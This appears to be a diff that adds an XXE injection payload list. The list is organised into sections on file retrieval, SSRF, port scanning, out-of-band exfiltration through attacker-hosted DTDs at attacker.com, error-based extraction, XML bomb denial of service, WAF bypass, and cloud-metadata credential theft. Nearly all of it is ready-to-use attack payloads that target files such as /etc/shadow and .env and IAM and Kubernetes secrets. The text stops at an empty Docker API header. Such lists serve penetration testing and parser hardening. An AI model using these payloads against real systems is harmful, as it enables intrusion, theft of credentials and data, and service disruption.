@@ -1,0 +1,1184 @@
+================================================================================
+XXE (XML EXTERNAL ENTITY) INJECTION - COMPLETE PAYLOAD LIST
+================================================================================
+
+TABLE OF CONTENTS:
+==================
+[1]  BASIC XXE - FILE RETRIEVAL
+[2]  XXE - SSRF ATTACKS
+[3]  BLIND XXE - OOB (OUT-OF-BAND) EXFILTRATION
+[4]  BLIND XXE - ERROR-BASED EXTRACTION
+[5]  XXE - DOS (BILLION LAUGHS / XML BOMB)
+[6]  XXE - ADVANCED ENTITY CHAINING
+[7]  XXE - WAF BYPASS TECHNIQUES
+[8]  XXE - ENCODING & OBFUSCATION
+[9]  XXE - SPECIFIC TECHNOLOGY PAYLOADS (Java, .NET, PHP, Python)
+[10] XXE - CLOUD METADATA EXTRACTION
+[11] XXE - INTERNAL NETWORK SCANNING
+[12] XXE - LOCAL FILE DISCOVERY
+[13] XXE - PARAMETER ENTITIES
+[14] XXE - CDATA ESCAPE PAYLOADS
+[15] XXE - MODERN PARSER BYPASSES
+
+================================================================================
+[1] BASIC XXE - FILE RETRIEVAL
+================================================================================
+
+# SIMPLE FILE READ (RETURNS IN RESPONSE)
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY>
+<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<foo>&xxe;</foo>
+
+# LINUX FILE READ
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY file SYSTEM "file:///etc/passwd">]>
+<root>&file;</root>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+<!ENTITY passwd SYSTEM "file:///etc/shadow">]>
+<data>&passwd;</data>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE config [
+<!ENTITY hosts SYSTEM "file:///etc/hosts">]>
+<config>&hosts;</config>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE release [
+<!ENTITY os SYSTEM "file:///etc/os-release">]>
+<release>&os;</release>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE phpini [
+<!ENTITY ini SYSTEM "file:///etc/php.ini">]>
+<phpini>&ini;</phpini>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE nginx [
+<!ENTITY conf SYSTEM "file:///etc/nginx/nginx.conf">]>
+<nginx>&conf;</nginx>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE apache [
+<!ENTITY conf SYSTEM "file:///etc/apache2/apache2.conf">]>
+<apache>&conf;</apache>
+
+# WINDOWS FILE READ
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY file SYSTEM "file:///c:/windows/win.ini">]>
+<root>&file;</root>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE windows [
+<!ENTITY system SYSTEM "file:///c:/windows/system.ini">]>
+<windows>&system;</windows>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE boot [
+<!ENTITY bootini SYSTEM "file:///c:/boot.ini">]>
+<boot>&bootini;</boot>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE webconfig [
+<!ENTITY config SYSTEM "file:///c:/inetpub/wwwroot/web.config">]>
+<webconfig>&config;</webconfig>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE hosts [
+<!ENTITY hosts SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]>
+<hosts>&hosts;</hosts>
+
+# SOURCE CODE FILES
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE code [
+<!ENTITY index SYSTEM "file:///var/www/html/index.php">]>
+<code>&index;</code>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE config [
+<!ENTITY dbconfig SYSTEM "file:///var/www/html/config.php">]>
+<config>&dbconfig;</config>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE app [
+<!ENTITY env SYSTEM "file:///var/www/.env">]>
+<app>&env;</app>
+
+# SYSTEM FILES
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE proc [
+<!ENTITY cmdline SYSTEM "file:///proc/self/cmdline">]>
+<proc>&cmdline;</proc>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE environ [
+<!ENTITY env SYSTEM "file:///proc/self/environ">]>
+<environ>&env;</environ>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE mounts [
+<!ENTITY mounts SYSTEM "file:///proc/self/mounts">]>
+<mounts>&mounts;</mounts>
+
+# LOG FILES
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE logs [
+<!ENTITY access SYSTEM "file:///var/log/apache2/access.log">]>
+<logs>&access;</logs>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE errorlog [
+<!ENTITY error SYSTEM "file:///var/log/apache2/error.log">]>
+<errorlog>&error;</errorlog>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE syslog [
+<!ENTITY syslog SYSTEM "file:///var/log/syslog">]>
+<syslog>&syslog;</syslog>
+
+# MULTIPLE FILE RETRIEVAL
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+<!ENTITY file1 SYSTEM "file:///etc/passwd">
+<!ENTITY file2 SYSTEM "file:///etc/hosts">
+<!ENTITY file3 SYSTEM "file:///etc/shadow">]>
+<data>&file1;&file2;&file3;</data>
+
+================================================================================
+[2] XXE - SSRF ATTACKS
+================================================================================
+
+# INTERNAL NETWORK DISCOVERY
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY ssrf SYSTEM "http://localhost/">]>
+<root>&ssrf;</root>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE scan [
+<!ENTITY local SYSTEM "http://127.0.0.1:80/">]>
+<scan>&local;</scan>
+
+# PORT SCANNING
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE scan [
+<!ENTITY port22 SYSTEM "http://127.0.0.1:22/">]>
+<scan>&port22;</scan>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE scan [
+<!ENTITY port80 SYSTEM "http://127.0.0.1:80/">]>
+<scan>&port80;</scan>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE scan [
+<!ENTITY port443 SYSTEM "http://127.0.0.1:443/">]>
+<scan>&port443;</scan>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE scan [
+<!ENTITY port3306 SYSTEM "http://127.0.0.1:3306/">]>
+<scan>&port3306;</scan>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE scan [
+<!ENTITY port5432 SYSTEM "http://127.0.0.1:5432/">]>
+<scan>&port5432;</scan>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE scan [
+<!ENTITY port6379 SYSTEM "http://127.0.0.1:6379/">]>
+<scan>&port6379;</scan>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE scan [
+<!ENTITY port8080 SYSTEM "http://127.0.0.1:8080/">]>
+<scan>&port8080;</scan>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE scan [
+<!ENTITY port9200 SYSTEM "http://127.0.0.1:9200/">]>
+<scan>&port9200;</scan>
+
+# INTERNAL IP RANGES
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE scan [
+<!ENTITY ip10 SYSTEM "http://10.0.0.1/">]>
+<scan>&ip10;</scan>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE scan [
+<!ENTITY ip172 SYSTEM "http://172.16.0.1/">]>
+<scan>&ip172;</scan>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE scan [
+<!ENTITY ip192 SYSTEM "http://192.168.0.1/">]>
+<scan>&ip192;</scan>
+
+# CLOUD METADATA (See Section 10 for complete list)
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE aws [
+<!ENTITY metadata SYSTEM "http://169.254.169.254/latest/meta-data/">]>
+<aws>&metadata;</aws>
+
+# PROTOCOL MANIPULATION
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY ftp SYSTEM "ftp://localhost:21/">]>
+<root>&ftp;</root>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY dict SYSTEM "dict://localhost:11211/">]>
+<root>&dict;</root>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY gopher SYSTEM "gopher://localhost:8080/_GET / HTTP/1.0%0A%0A">]>
+<root>&gopher;</root>
+
+================================================================================
+[3] BLIND XXE - OOB (OUT-OF-BAND) EXFILTRATION
+================================================================================
+
+# BASIC OOB EXFILTRATION (DNS/HTTP)
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+%dtd;
+]>
+<data>&send;</data>
+
+# EXTERNAL DTD FILE (evil.dtd hosted on attacker.com)
+-------------------------------------------------------------------------------
+<!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?data=%file;'>">
+%payload;
+
+# PHP-BASED OOB EXFILTRATION
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+%dtd;
+]>
+<root>&send;</root>
+
+# EXTERNAL DTD FOR PHP (evil.dtd)
+-------------------------------------------------------------------------------
+<!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?data=%file;'>">
+%payload;
+
+# OOB WITH BASE64 ENCODING (to avoid special chars)
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+%dtd;
+]>
+<data>&send;</data>
+
+# FTP OOB EXFILTRATION
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % dtd SYSTEM "ftp://attacker.com/evil.dtd">
+%dtd;
+]>
+<data>&send;</data>
+
+# MULTI-PART OOB (Windows)
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+<!ENTITY % file SYSTEM "file:///c:/windows/win.ini">
+<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+%dtd;
+]>
+<data>&send;</data>
+
+# OOB WITH HTTP PARAMETER POLLUTION
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % dtd SYSTEM "http://attacker.com/?data=%file;">
+%dtd;
+]>
+<data>&send;</data>
+
+# DNS EXFILTRATION (subdomain data)
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+%dtd;
+]>
+<data>&send;</data>
+
+# EXTERNAL DTD FOR DNS (evil.dtd)
+-------------------------------------------------------------------------------
+<!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http://%file;.attacker.com/'>">
+%payload;
+
+================================================================================
+[4] BLIND XXE - ERROR-BASED EXTRACTION
+================================================================================
+
+# BASIC ERROR-BASED (Malformed DTD)
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % error "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%error;
+]>
+<data>&error;</data>
+
+# ERROR WITH EXTERNAL DTD (Using existing system DTD)
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE message [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+<!ENTITY % ISOamso '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
+
+# ERROR WITH EXTERNAL DTD (Alternative Linux DTDs)
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/declaration/xml-core.dtd">
+<!ENTITY % ISOamso '
+<!ENTITY &#x25; file SYSTEM "file:///etc/shadow">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+<root>test</root>
+
+# ERROR WITH EXTERNAL DTD (Windows)
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE message [
+<!ENTITY % local_dtd SYSTEM "file:///C:/Windows/System32/wbem/xml/cim20.dtd">
+<!ENTITY % CIM '
+<!ENTITY &#x25; file SYSTEM "file:///c:/windows/win.ini">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
+
+# ERROR WITH PARAMETER ENTITIES
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY % xxe SYSTEM "file:///etc/passwd">
+<!ENTITY % error "<!ENTITY &#x25; error SYSTEM 'http://attacker.com/%xxe;'>">
+%error;
+]>
+<root>&error;</root>
+
+# INVALID URI ERROR
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % dtd SYSTEM "http://attacker.com/%file;.dtd">
+%dtd;
+]>
+<data>&send;</data>
+
+
+================================================================================
+[5] XXE - DOS (BILLION LAUGHS / XML BOMB)
+================================================================================
+
+# BILLION LAUGHS ATTACK (Recursive Entity Expansion)
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE lolz [
+<!ENTITY lol "lol">
+<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+]>
+<lolz>&lol9;</lolz>
+
+# QUADRATIC BLOWUP ATTACK
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE kaboom [
+<!ENTITY a "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
+<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
+<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
+<!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
+]>
+<kaboom>&d;</kaboom>
+
+# MILLION LAUGHS (More aggressive)
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE ml [
+<!ENTITY ml "ml">
+<!ENTITY ml1 "&ml;&ml;&ml;&ml;&ml;&ml;&ml;&ml;&ml;&ml;">
+<!ENTITY ml2 "&ml1;&ml1;&ml1;&ml1;&ml1;&ml1;&ml1;&ml1;&ml1;&ml1;">
+<!ENTITY ml3 "&ml2;&ml2;&ml2;&ml2;&ml2;&ml2;&ml2;&ml2;&ml2;&ml2;">
+<!ENTITY ml4 "&ml3;&ml3;&ml3;&ml3;&ml3;&ml3;&ml3;&ml3;&ml3;&ml3;">
+<!ENTITY ml5 "&ml4;&ml4;&ml4;&ml4;&ml4;&ml4;&ml4;&ml4;&ml4;&ml4;">
+<!ENTITY ml6 "&ml5;&ml5;&ml5;&ml5;&ml5;&ml5;&ml5;&ml5;&ml5;&ml5;">
+<!ENTITY ml7 "&ml6;&ml6;&ml6;&ml6;&ml6;&ml6;&ml6;&ml6;&ml6;&ml6;">
+]>
+<ml>&ml7;</ml>
+
+================================================================================
+[6] XXE - ADVANCED ENTITY CHAINING
+================================================================================
+
+# NESTED ENTITIES
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY % outer "<!ENTITY inner SYSTEM 'file:///etc/passwd'>">
+%outer;
+]>
+<root>&inner;</root>
+
+# CONDITIONAL ENTITIES (Requires certain parsers)
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY % cond SYSTEM "file:///etc/passwd">
+<!ENTITY % conditional "<!ENTITY &#x25; result SYSTEM 'http://attacker.com/%cond;'>">
+%conditional;
+]>
+<root>&result;</root>
+
+# EXTERNAL PARAMETER ENTITY CHAINING
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+<!ENTITY % dtd1 SYSTEM "http://attacker.com/first.dtd">
+%dtd1;
+<!ENTITY % dtd2 SYSTEM "http://attacker.com/second.dtd">
+%dtd2;
+]>
+<data>&send;</data>
+
+# first.dtd
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % dtd2 SYSTEM "http://attacker.com/second.dtd?data=%file;">
+
+# second.dtd
+<!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/collect?done=1'>">
+
+# RECURSIVE ENTITY INCLUSION
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % recursion "<!ENTITY &#x25; file2 SYSTEM 'http://attacker.com/%file;'>">
+%recursion;
+]>
+<root>&file2;</root>
+
+================================================================================
+[7] XXE - WAF BYPASS TECHNIQUES
+================================================================================
+
+# UTF-16 ENCODING BYPASS
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-16"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>&xxe;</root>
+
+# UTF-32 ENCODING BYPASS
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-32"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>&xxe;</root>
+
+# ISO-8859-1 ENCODING BYPASS
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>&xxe;</root>
+
+# CASE VARIATION (DOCTYPE, ENTITY, SYSTEM)
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DoCtYpE root [
+<!EnTiTy xxe SYSTEM "file:///etc/passwd">]>
+<root>&xxe;</root>
+
+# WHITESPACE VARIATIONS
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root[
+<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>&xxe;</root>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>
+&xxe;
+</root>
+
+# COMMENT INJECTION
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+<!-- comment -->
+]>
+<root>&xxe;</root>
+
+# MIXED CASE ENTITIES
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY XxE SYSTEM "file:///etc/passwd">]>
+<root>&XxE;</root>
+
+# HTML ENTITY BYPASS (if XML parser is lenient)
+-------------------------------------------------------------------------------
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>&xxe;</root>
+
+# WITHOUT XML DECLARATION
+-------------------------------------------------------------------------------
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>&xxe;</root>
+
+# MULTIPLE DOCTYPE DECLARATIONS
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<!DOCTYPE fake [
+<!ENTITY fake SYSTEM "file:///dev/null">]>
+<root>&xxe;</root>
+
+================================================================================
+[8] XXE - ENCODING & OBFUSCATION
+================================================================================
+
+# HEX ENTITIES
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>&#x78;&#x78;&#x65;</root>
+
+# DECIMAL ENTITIES
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>&#120;&#120;&#101;</root>
+
+# MIXED ENTITY ENCODING
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>&#120;&#x78;&#101;</root>
+
+# URL ENCODING IN FILE PATH
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "file:///%2fetc/%2fpasswd">]>
+<root>&xxe;</root>
+
+# DOUBLE URL ENCODING
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "file:///%252fetc%252fpasswd">]>
+<root>&xxe;</root>
+
+# UNICODE ESCAPING
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>&#x0078;&#x0078;&#x0065;</root>
+
+================================================================================
+[9] XXE - SPECIFIC TECHNOLOGY PAYLOADS
+================================================================================
+
+# JAVA XXE PAYLOADS
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>&xxe;</root>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "jar:file:///var/www/html/file.zip!/etc/passwd">]>
+<root>&xxe;</root>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "netdoc:/etc/passwd">]>
+<root>&xxe;</root>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "http://localhost:8080/api">]>
+<root>&xxe;</root>
+
+# .NET XXE PAYLOADS
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
+<root>&xxe;</root>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "https://localhost:443/api">]>
+<root>&xxe;</root>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "ftp://localhost:21">]>
+<root>&xxe;</root>
+
+# PHP XXE PAYLOADS
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]>
+<root>&xxe;</root>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "expect://ls">]>
+<root>&xxe;</root>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>&xxe;</root>
+
+# PYTHON XXE PAYLOADS
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>&xxe;</root>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "http://localhost:8000">]>
+<root>&xxe;</root>
+
+# RUBY XXE PAYLOADS
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>&xxe;</root>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "net://localhost:8080">]>
+<root>&xxe;</root>
+
+================================================================================
+[10] XXE - CLOUD METADATA EXTRACTION
+================================================================================
+
+# AWS METADATA
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE aws [
+<!ENTITY metadata SYSTEM "http://169.254.169.254/latest/meta-data/">]>
+<aws>&metadata;</aws>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE aws [
+<!ENTITY userdata SYSTEM "http://169.254.169.254/latest/user-data/">]>
+<aws>&userdata;</aws>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE aws [
+<!ENTITY iam SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
+<aws>&iam;</aws>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE aws [
+<!ENTITY token SYSTEM "http://169.254.169.254/latest/api/token">]>
+<aws>&token;</aws>
+
+# GCP METADATA
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE gcp [
+<!ENTITY metadata SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]>
+<gcp>&metadata;</gcp>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE gcp [
+<!ENTITY token SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">]>
+<gcp>&token;</gcp>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE gcp [
+<!ENTITY project SYSTEM "http://metadata.google.internal/computeMetadata/v1/project/project-id">]>
+<gcp>&project;</gcp>
+
+# AZURE METADATA
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE azure [
+<!ENTITY metadata SYSTEM "http://169.254.169.254/metadata/instance?api-version=2017-08-01">]>
+<azure>&metadata;</azure>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE azure [
+<!ENTITY token SYSTEM "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/">]>
+<azure>&token;</azure>
+
+# KUBERNETES API
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE k8s [
+<!ENTITY api SYSTEM "http://kubernetes.default.svc.cluster.local/api/v1/">]>
+<k8s>&api;</k8s>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE k8s [
+<!ENTITY secrets SYSTEM "http://kubernetes.default.svc.cluster.local/api/v1/namespaces/default/secrets">]>
+<k8s>&secrets;</k8s>
+
+# DOCKER API
+-------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
